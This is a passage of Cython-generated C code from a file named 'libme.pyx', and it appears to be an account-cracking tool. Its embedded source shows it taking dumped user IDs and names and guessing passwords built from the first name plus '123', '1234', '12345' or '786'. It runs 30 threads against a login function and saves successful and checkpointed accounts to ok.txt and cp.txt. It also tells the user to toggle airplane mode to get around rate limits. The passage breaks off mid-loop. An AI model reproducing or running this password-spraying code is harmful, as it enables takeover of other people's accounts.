            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            goto __pyx_L19_exception_handled;
          }
          __pyx_L20_except_error:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          goto __pyx_L1_error;
          __pyx_L19_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          __pyx_L23_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 963, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          goto __pyx_L17;
        }
        __pyx_L17:;
      }
      goto __pyx_L32;
      __pyx_L14_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L32:;
    }

    /* "libme.pyx":962
 * 			exit("\n [!] Please Dump File first %s "%(myfile))
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 */
    goto __pyx_L13;
  }

  /* "libme.pyx":975
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  __pyx_t_19 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_t, Py_EQ)); if (unlikely(__pyx_t_19 < 0)) __PYX_ERR(0, 975, __pyx_L1_error)
  if (__pyx_t_19) {

    /* "libme.pyx":976
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 976, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 976, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 976, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_empty_tuple, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 976, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 976, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_10 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 976, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_17 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_17)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_17);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_4 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 976, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __pyx_t_4;
      __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_1, &__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_2);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_10;
            __pyx_t_10 = 0;

            /* "libme.pyx":977
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 977, __pyx_L37_error)

            /* "libme.pyx":978
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 978, __pyx_L37_error)

            /* "libme.pyx":979
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")             # <<<<<<<<<<<<<<
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_if_no_result_turn_on_airplane_m) < 0) __PYX_ERR(0, 979, __pyx_L37_error)

            /* "libme.pyx":980
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 980, __pyx_L37_error)
            __Pyx_GOTREF(__pyx_t_10);
            if (likely(PyList_CheckExact(__pyx_t_10)) || PyTuple_CheckExact(__pyx_t_10)) {
              __pyx_t_5 = __pyx_t_10; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 980, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 980, __pyx_L37_error)
            }
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 980, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 980, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 980, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 980, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                }
              } else {
                __pyx_t_10 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_10)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 980, __pyx_L37_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_10);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":981
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:
 * 						uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 */
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 981, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_4);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_4, function);
                }
              }
              __pyx_t_10 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_17, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 981, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_10))) || (PyList_CheckExact(__pyx_t_10))) {
                PyObject* sequence = __pyx_t_10;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 981, __pyx_L37_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_4 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_4 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_17);
                #else
                __pyx_t_4 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 981, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_17 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 981, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                #endif
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 981, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_4 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_4)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_4);
                index = 1; __pyx_t_17 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_17)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_17);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 981, __pyx_L37_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L46_unpacking_done;
                __pyx_L45_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 981, __pyx_L37_error)
                __pyx_L46_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_4);
              __pyx_t_4 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":982
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]             # <<<<<<<<<<<<<<
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
              __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_name, __pyx_n_s_split); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 982, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __pyx_t_4 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
                __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_17);
                if (likely(__pyx_t_4)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                  __Pyx_INCREF(__pyx_t_4);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_17, function);
                }
              }
              __pyx_t_10 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_17, __pyx_t_4, __pyx_kp_s__43) : __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_kp_s__43);
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 982, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              __pyx_t_17 = __Pyx_GetItemInt(__pyx_t_10, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 982, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_XDECREF_SET(__pyx_v_ft, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":983
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 983, __pyx_L37_error)
              __pyx_t_19 = ((__pyx_t_20 >= 6) != 0);
              if (__pyx_t_19) {

                /* "libme.pyx":984
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 984, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 984, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 984, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 984, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyList_New(5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 984, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_6, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_6, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_6, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_6, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_6, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_6));
                __pyx_t_6 = 0;

                /* "libme.pyx":983
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":985
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 985, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 3) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 985, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 4) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 985, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 5) != 0);
              __pyx_t_19 = __pyx_t_13;
              __pyx_L48_bool_binop_done:;
              if (__pyx_t_19) {

                /* "libme.pyx":986
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 986, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 986, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 986, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 986, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_17 = PyList_New(5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 986, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_17, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_17, 1, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_17, 2, __pyx_t_9);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_17, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_17, 4, __pyx_t_10);
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __pyx_t_4 = 0;
                __pyx_t_10 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_17));
                __pyx_t_17 = 0;

                /* "libme.pyx":985
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":988
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __me__nnn__(self):
 */
              /*else*/ {
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 988, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 988, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 988, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 988, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyList_New(5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 988, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_6, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_6, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_6, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_6, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_6, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_6));
                __pyx_t_6 = 0;
              }
              __pyx_L47:;

              /* "libme.pyx":989
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)             # <<<<<<<<<<<<<<
 * 	def __me__nnn__(self):
 * 		try:
 */
              __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 989, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_9);
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_f_james); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 989, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_10 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_9, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_4, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 989, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_4, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 989, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 989, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_10) {
                  __Pyx_GIVEREF(__pyx_t_10); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_10); __pyx_t_10 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_4);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_INCREF(__pyx_v_pwx);
                __Pyx_GIVEREF(__pyx_v_pwx);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_v_pwx);
                __pyx_t_4 = 0;
                __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_17, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 989, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "libme.pyx":980
 * 					print("  [] Cp result saved in > cp.txt")
